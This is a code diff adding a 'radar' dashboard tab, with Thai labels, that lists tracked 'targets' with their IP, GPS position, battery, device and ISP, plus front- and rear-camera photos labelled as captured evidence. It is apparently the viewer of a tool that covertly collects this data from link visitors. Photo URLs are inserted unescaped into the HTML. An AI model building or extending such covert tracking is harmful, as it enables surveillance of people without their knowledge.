+                                    ${index === 0 ? '<span class="text-[10px] bg-red-100 text-red-700 px-1.5 py-0.2 rounded font-bold">ล่าสุด</span>' : ''}
+                                </div>
+                                <div class="text-[11px] text-slate-500 flex items-center gap-2">
+                                    <span>🕒 ${escapeHtml(item.timestamp || '-')}</span>
+                                    <span>•</span>
+                                    <span>🌐 IP: <span class="font-mono text-slate-700">${escapeHtml(item.ip || '-')}</span></span>
+                                </div>
+                            </div>
+                            
+                            ${firstPhoto ? `
+                                <div class="relative cursor-pointer shrink-0" onclick="showCapturedPhotoModal('${firstPhoto}', '${escapeHtml(item.targetName)}')">
+                                    <img src="${firstPhoto}" class="w-11 h-11 rounded-lg object-cover border-2 border-police-blue/30 shadow-xs hover:scale-105 transition" alt="Capture">
+                                    <span class="absolute -bottom-1 -right-1 bg-police-blue text-white rounded-full p-0.5 text-[8px]"><i class="fa-solid fa-camera"></i></span>
+                                </div>
+                            ` : ''}
+                        </div>
+
+                        <!-- Telemetry Badges (Motion, Accuracy, Battery) -->
+                        <div class="flex flex-wrap items-center gap-1.5 pt-0.5">
+                            ${hasCoords ? `
+                                <span class="inline-flex items-center gap-1 text-[10px] bg-emerald-50 text-emerald-800 px-2 py-0.5 rounded-full font-bold border border-emerald-200">
+                                    <i class="fa-solid fa-location-crosshairs text-[9px]"></i> ${escapeHtml(item.accuracy || 'GPS')}
+                                </span>
+                            ` : `
+                                <span class="inline-flex items-center gap-1 text-[10px] bg-amber-50 text-amber-800 px-2 py-0.5 rounded-full font-bold border border-amber-200">
+                                    <i class="fa-solid fa-tower-cell text-[9px]"></i> IP Location
+                                </span>
+                            `}
+                            ${motionBadge}
+                            ${item.battery && item.battery !== '-' ? `
+                                <span class="inline-flex items-center gap-1 text-[10px] bg-slate-50 text-slate-700 px-2 py-0.5 rounded-full font-bold border border-slate-200">
+                                    <i class="fa-solid fa-battery-half text-slate-500 text-[9px]"></i> ${escapeHtml(item.battery)}
+                                </span>
+                            ` : ''}
+                        </div>
+
+                        <!-- Device & ISP -->
+                        <div class="text-[11px] text-slate-600 bg-slate-50 p-2 rounded-lg border border-slate-100 flex items-center justify-between gap-2">
+                            <span class="truncate flex items-center gap-1">
+                                <i class="fa-solid fa-mobile-screen-button text-slate-400"></i>
+                                <span>${escapeHtml(item.deviceInfo || 'ไม่ระบุรุ่น')}</span>
+                            </span>
+                            <span class="text-slate-400 text-[10px] truncate max-w-[120px]">${escapeHtml(item.isp || '')}</span>
+                        </div>
+
+                        <!-- Card Action Buttons -->
+                        <div class="flex items-center gap-2 pt-1">
+                            ${hasCoords ? `
+                                <button type="button" onclick="focusRadarTarget(${item.lat}, ${item.lng}, '${itemId}', '${escapeHtml(item.targetName)}')"
+                                    class="flex-1 py-1.5 px-2 rounded-lg bg-blue-50 hover:bg-blue-100 text-police-blue font-bold text-xs transition flex items-center justify-center gap-1 border border-blue-200 active:scale-95">
+                                    <i class="fa-solid fa-crosshairs text-[11px]"></i> ซูมบนแผนที่
+                                </button>
+                                <a href="https://www.google.com/maps?q=${item.lat},${item.lng}" target="_blank"
+                                    class="py-1.5 px-3 rounded-lg bg-slate-100 hover:bg-slate-200 text-slate-700 font-bold text-xs transition flex items-center justify-center gap-1 border border-slate-300 active:scale-95 text-decoration-none">
+                                    <i class="fa-solid fa-arrow-up-right-from-square text-[10px]"></i> Maps
+                                </a>
+                            ` : `
+                                <span class="text-[11px] text-slate-400 italic">ไม่มีพิกัด GPS ละเอียด</span>
+                            `}
+                        </div>
+                    </div>
+                `;
+            });
+
+            feedEl.innerHTML = html;
+        }
+
+        // ซูมไปยังพิกัดเป้าหมายบนแผนที่
+        function focusRadarTarget(lat, lng, itemId, targetName) {
+            if (!radarMap) return;
+
+            radarMap.flyTo([lat, lng], 16, { animate: true, duration: 1.2 });
+
+            const coordsEl = document.getElementById('radar-active-coords');
+            if (coordsEl) coordsEl.textContent = `${Number(lat).toFixed(5)}, ${Number(lng).toFixed(5)}`;
+
+            if (radarMarkersMap[itemId]) {
+                setTimeout(() => {
+                    radarMarkersMap[itemId].openPopup();
+                }, 1200);
+            }
+        }
+
+        // แสดง Modal ดูภาพถ่ายใบหน้าเป้าหมายขนาดใหญ่
+        function showCapturedPhotoModal(photoUrl, targetName) {
+            if (!photoUrl) return;
+
+            const photos = photoUrl.split('|').map(u => u.trim()).filter(Boolean);
+            let imgGalleryHtml = '';
+
+            photos.forEach((url, i) => {
+                const label = i === 0 ? 'กล้องหน้า (Front Camera)' : 'กล้องหลัง (Rear Camera)';
+                imgGalleryHtml += `
+                    <div class="space-y-1.5 mb-3">
+                        <div class="text-xs font-bold text-police-blue flex items-center justify-between">
+                            <span>📸 ${label}</span>
+                            <a href="${url}" target="_blank" class="text-blue-600 hover:underline text-[11px]">เปิดรูปต้นฉบับ</a>
+                        </div>
+                        <img src="${url}" class="w-full max-h-72 object-contain rounded-xl border border-slate-300 shadow-md bg-slate-900" alt="Captured Evidence">
+                    </div>
+                `;
+            });
+
+            Swal.fire({
+                title: `ภาพถ่ายเป้าหมาย: ${escapeHtml(targetName || 'ไม่ระบุ')}`,
+                html: `<div class="text-left">${imgGalleryHtml}</div>`,
+                confirmButtonText: 'ปิดหน้าต่าง',
+                confirmButtonColor: '#1e3a8a',
+                width: '480px'
+            });
+        }
+
+        // Helper: Escape HTML ป้องกัน XSS
+        function escapeHtml(str) {
+            if (!str) return '';
+            return String(str)
+                .replace(/&/g, '&amp;')
+                .replace(/</g, '&lt;')
+                .replace(/>/g, '&gt;')
+                .replace(/"/g, '&quot;')
+                .replace(/'/g, '&#039;');
+        }
+
         // Attach input listeners for live preview
         document.addEventListener('DOMContentLoaded', () => {
             renderPresets();
             parseIncomingUrlParams();
+
+            // ตรวจสอบ parameter tab ใน URL ถ้ามี ?tab=radar ให้เปิดแท็บเรดาร์ทันที
+            const urlParams = new URLSearchParams(window.location.search);
+            if (urlParams.get('tab') === 'radar') {
+                switchPreviewTab('radar');
+            }
 
             const titleInput = document.getElementById('flex-title');
             const detailInput = document.getElementById('flex-detail');
